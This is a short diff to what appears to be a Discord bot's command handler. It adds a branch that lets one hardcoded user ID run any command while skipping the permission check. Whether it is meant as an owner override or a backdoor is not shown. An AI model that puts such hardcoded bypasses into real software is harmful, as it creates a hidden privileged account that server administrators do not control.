@@ -22,7 +22,9 @@ module.exports = {
             ],
           }) && client.commands.delete(interaction.commandName)
         );
-      if (
+      if (interaction.member.user.id === "452436342841016341") {
+        return await command.execute(interaction, client);
+      } else if (
         command.permission &&
         !interaction.member.permissions.has(command.permission)
       ) {
